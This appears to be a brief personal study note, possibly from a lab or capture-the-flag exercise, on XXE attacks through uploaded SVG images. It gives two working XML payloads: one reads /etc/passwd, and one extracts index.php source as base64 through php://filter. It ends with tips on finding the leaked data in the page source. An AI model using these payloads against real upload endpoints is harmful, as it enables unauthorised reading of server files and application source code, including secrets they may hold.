we can do a XXE exploit using .svg images potentially leaking source code and reading files

saving this to a .svg file we can read files 
(we can also do it using .png it doesnt necesseraly need to be .svg)

```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<svg>&xxe;</svg>
```

[we can look at the file using ctr + u to]
and with this we can read source code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

[we can look at the page source using ctr + u to find the base64 encoded source code]

![[Pasted image 20241124025731.png]]

